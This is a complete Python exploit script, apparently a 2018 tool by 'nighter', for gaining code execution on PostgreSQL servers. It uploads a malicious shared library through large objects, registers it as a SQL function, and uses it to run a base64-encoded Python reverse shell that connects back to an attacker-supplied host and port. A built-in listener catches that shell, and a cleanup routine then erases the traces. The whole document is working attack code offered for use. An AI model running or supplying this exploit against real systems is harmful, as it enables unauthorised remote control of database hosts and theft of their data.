#!/usr/bin/env python2
#  -*- coding: utf-8 -*- #######################################################################################
#██▓███   ▒█████    ██████ ▄▄▄█████▓  ▄████  ██▀███  ▓█████   ██████  ██▀███   ▄████▄  ▓█████                  #
#▓██░  ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒ ██▒ ▀█▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀                 #
#▓██░ ██▓▒▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██░▄▄▄░▓██ ░▄█ ▒▒███   ░ ▓██▄   ▓██ ░▄█ ▒▒▓█    ▄ ▒███                   #
#▒██▄█▓▒ ▒▒██   ██░  ▒   ██▒░ ▓██▓ ░ ░▓█  ██▓▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄                 #
#▒██▒ ░  ░░ ████▓▒░▒██████▒▒  ▒██▒ ░ ░▒▓███▀▒░██▓ ▒██▒░▒████▒▒██████▒▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒                #
#▒▓▒░ ░  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░    ░▒   ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░                #
#░▒ ░       ░ ▒ ▒░ ░ ░▒  ░ ░    ░      ░   ░   ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░                #
#░░       ░ ░ ░ ▒  ░  ░  ░    ░      ░ ░   ░   ░░   ░    ░   ░  ░  ░    ░░   ░ ░           ░                   #
#░ ░        ░                 ░    ░        ░  ░      ░     ░     ░ ░         ░  ░                             #
# DATE                                                                                                         #
# 16/08/2018                                                                                                   #
#                                                                                                              #
# DESCRIPTION                                                                                                  #
# Remote tcp connection in postgres by upload a shared object file that gives you code execution               #
#                                                                                                              #
# nighter - http://nighter.se/                                                                                 #
#                                                                                                              #
################################################################################################################

import signal
import termios
import select
import socket
import os
import fcntl
import sys
import psycopg2
import time
import base64
import sys
import os


from multiprocessing import Process

# Handler to exist cleanly on ctrl+C
def signal_handler(signal, frame):
    print "\nYou pressed Ctrl+C!"
    payload_cleanup()
    sys.exit()
signal.signal(signal.SIGINT, signal_handler)

class PTY:
    def __init__(self, slave=0, pid=os.getpid()):
        # apparently python GC's modules before class instances so, here
        # we have some hax to ensure we can restore the terminal state.
        self.termios, self.fcntl = termios, fcntl

        # open our controlling PTY
        self.pty = open(os.readlink("/proc/%d/fd/%d" % (pid, slave)), "rb+")

        # store our old termios settings so we can restore after
        # we are finished
        self.oldtermios = termios.tcgetattr(self.pty)

        # get the current settings se we can modify them
        newattr = termios.tcgetattr(self.pty)

        # set the terminal to uncanonical mode and turn off
        # input echo.
        newattr[3] &= ~termios.ICANON & ~termios.ECHO

        # don't handle ^C / ^Z / ^\
        newattr[6][termios.VINTR] = '\x00'
        newattr[6][termios.VQUIT] = '\x00'
        newattr[6][termios.VSUSP] = '\x00'

        # set our new attributes
        termios.tcsetattr(self.pty, termios.TCSADRAIN, newattr)

        # store the old fcntl flags
        self.oldflags = fcntl.fcntl(self.pty, fcntl.F_GETFL)
        # fcntl.fcntl(self.pty, fcntl.F_SETFD, fcntl.FD_CLOEXEC)
        # make the PTY non-blocking
        fcntl.fcntl(self.pty, fcntl.F_SETFL, self.oldflags | os.O_NONBLOCK)

    def read(self, size=8192):
        return self.pty.read(size)

    def write(self, data):
        ret = self.pty.write(data)
        self.pty.flush()
        return ret

    def fileno(self):
        return self.pty.fileno()

    def __del__(self):
        # restore the terminal settings on deletion
        self.termios.tcsetattr(self.pty, self.termios.TCSAFLUSH, self.oldtermios)
        self.fcntl.fcntl(self.pty, self.fcntl.F_SETFL, self.oldflags)


class Shell:
    def __init__(self, addr, bind=True):
        self.bind = bind
        self.addr = addr

        if self.bind:
            self.sock = socket.socket()
            self.sock.bind(self.addr)
            self.sock.listen(5)

    def handle(self, addr=None):
        addr = addr or self.addr
        if self.bind:
            sock, addr = self.sock.accept()
        else:
            sock = socket.socket()
            sock.connect(addr)

        # create our PTY
        pty = PTY()

        # input buffers for the fd's
        buffers = [[sock, []], [pty, []]]

        def buffer_index(fd):
            for index, buffer in enumerate(buffers):
                if buffer[0] == fd:
                    return index

        readable_fds = [sock, pty]

        data = " "
        # keep going until something deds
        while data:
            # if any of the fd's need to be written to, add them to the
            # writable_fds
            writable_fds = []
            for buffer in buffers:
                if buffer[1]:
                    writable_fds.append(buffer[0])

            r, w, x = select.select(readable_fds, writable_fds, [])

            # read from the fd's and store their input in the other fd's buffer
            for fd in r:
                buffer = buffers[buffer_index(fd) ^ 1][1]
                if hasattr(fd, "read"):
                    data = fd.read(8192)
                else:
                    data = fd.recv(8192)
                if data:
                    buffer.append(data)

            # send data from each buffer onto the proper FD
            for fd in w:
                buffer = buffers[buffer_index(fd)][1]
                data = buffer[0]
                if hasattr(fd, "write"):
                    fd.write(data)
                else:
                    fd.send(data)
                buffer.remove(data)

        # close the socket
        sock.close()


def get_version(con):

    cur = con.cursor()
    try:
        cur.execute("""SELECT version()""")
    except:
        print("Could not get version")
        sys.exit(1)

    rows = cur.fetchall()
    cur.close()
    try:
        return str([r for r in rows][0][0])
    except:
        return ''


def get_loid(con):

    cur = con.cursor()
    try:
        cur.execute("""SELECT lo_creat(-1)""")
    except:
        print("Could not get version")
        sys.exit(1)

    rows = cur.fetchall()
    try:
        return str([r for r in rows][0][0])
    except:
        return ''


def build_python_reverse_shell():

    python_rev_shell = '''python2 -c \'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM);\
s.connect(("%s", %s));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()\'''' % (LHOST, LPORT)
    payload = 'echo %s|base64 -d|bash' % base64.b64encode(python_rev_shell)
    return payload


def exploit():

    time.sleep(5)
    print("[+] Exploit")

    con = postres_connect()
    cur = con.cursor()
    cur.execute("SELECT sys('%s')" % build_python_reverse_shell())
    cur.close()
    con.close()


def create_payload():

    con = postres_connect()
    print("[+] Created payload")

    if os.path.isfile('/usr/bin/split') is False:
        print("ERROR split application is required")
        sys.exit(1)

    if os.path.exists('/tmp/.pg_split') is False:
        os.makedirs('/tmp/.pg_split')

    version = get_version(con)
    print("[+] Version: %s" % version)
    libver = version.split(' ')[1]

    if os.path.isfile('lib/pg_exec-%s.so' % libver) is False:
        print("[-] lib/pg_exec-%s.so not found, lib is required for the version of postres you are attacking, please build." % libver)
        sys.exit(1)

    os.system("split -b 2048 lib/pg_exec-%s.so /tmp/.pg_split/" % libver)

    loid = get_loid(con)

    query = '''DELETE FROM pg_largeobject WHERE loid=%s;''' % loid
    query += '''\nINSERT INTO pg_largeobject (loid, pageno, data) values '''

    for root, dirs, files in os.walk('/tmp/.pg_split/', topdown=True):
        files.sort(reverse=False)

    i = 0
    for file in files:
        with open('/tmp/.pg_split/%s' % file, "rb") as binfile:
            query += "(%s, %s, decode('%s','base64')), " % (loid, str(i), base64.b64encode(binfile.read()).strip())
            i += 1

    query = query[:-2] + ';'
    query = query.replace('\n', '')

    query += '''\nSELECT lo_export(%s, '/tmp/pg_exec.so');''' % loid
    query += '''CREATE FUNCTION sys(cstring) RETURNS int as '/tmp/pg_exec.so', 'pg_exec' LANGUAGE 'c' STRICT;'''

    cur = con.cursor()
    try:
        cur.execute(query)
    except psycopg2.ProgrammingError, e:
        con.rollback()
    except:
        print("[-] Could not upload pg_exec.so")
        con.rollback()
        cur.close()
        con.close()
        sys.exit(0)

    cur.close()
    con.close()


def payload_cleanup():

    time.sleep(15)

    con = postres_connect()
    loid = get_loid(con)

    cur = con.cursor()
    try:
        cur.execute("DELETE FROM pg_largeobject WHERE loid=%s; DROP FUNCTION sys(cstring);" % loid)
    except:
        print("[-] Payload cleanup failed")
        con.rollback()
        cur.close()
        con.close()
        sys.exit(0)

    cur.close()
    con.close()


def postres_connect():

    try:
        con = psycopg2.connect("dbname='' user='%s' host='%s' password='%s'" % (USERNAME, HOST, PASSWORD))
    except:
        print("[-] Could not connect to postgres server")
        sys.exit(1)

    return con


if __name__ == '__main__':

    if len(sys.argv) != 6:
        print ("""
 ██▓███   ▒█████    ██████ ▄▄▄█████▓  ▄████  ██▀███  ▓█████   ██████  ██▀███   ▄████▄  ▓█████ 
▓██░  ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒ ██▒ ▀█▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▓██ ▒ ██▒▒██▀ ▀█  ▓█   ▀ 
▓██░ ██▓▒▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░▒██░▄▄▄░▓██ ░▄█ ▒▒███   ░ ▓██▄   ▓██ ░▄█ ▒▒▓█    ▄ ▒███   
▒██▄█▓▒ ▒▒██   ██░  ▒   ██▒░ ▓██▓ ░ ░▓█  ██▓▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒▒██▀▀█▄  ▒▓▓▄ ▄██▒▒▓█  ▄ 
▒██▒ ░  ░░ ████▓▒░▒██████▒▒  ▒██▒ ░ ░▒▓███▀▒░██▓ ▒██▒░▒████▒▒██████▒▒░██▓ ▒██▒▒ ▓███▀ ░░▒████▒
▒▓▒░ ░  ░░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░    ░▒   ▒ ░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░░ ▒▓ ░▒▓░░ ░▒ ▒  ░░░ ▒░ ░
░▒ ░       ░ ▒ ▒░ ░ ░▒  ░ ░    ░      ░   ░   ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░  ░▒ ░ ▒░  ░  ▒    ░ ░  ░
░░       ░ ░ ░ ▒  ░  ░  ░    ░      ░ ░   ░   ░░   ░    ░   ░  ░  ░    ░░   ░ ░           ░   
             ░ ░        ░                 ░    ░        ░  ░      ░     ░     ░ ░         ░  ░
                                                                              ░              
[nighter@nighter.se]
    """)
        print("Usage: %s <HOST> <LHOST> <LPORT> <USERNAME> <PASSWORD>" % (sys.argv[0]))
        print("\nEXAMPLE: ./postgres_rce.py '127.0.0.1' 10.10.14.24 1337 postgres password\n")
        sys.exit(0)

    HOST = sys.argv[1]
    LHOST = sys.argv[2]
    LPORT = sys.argv[3]
    USERNAME = sys.argv[4]
    PASSWORD = sys.argv[5]

    print("[+] LHOST = %s" % LHOST)

    create_payload()

    # Remove war
    p = Process(target=exploit)
    p.start()

    # Remove war
    p = Process(target=payload_cleanup)
    p.start()

    # Start listener
    print("[+] Shell listen")
    s = Shell((LHOST, int(LPORT)), bind=True)
    s.handle()
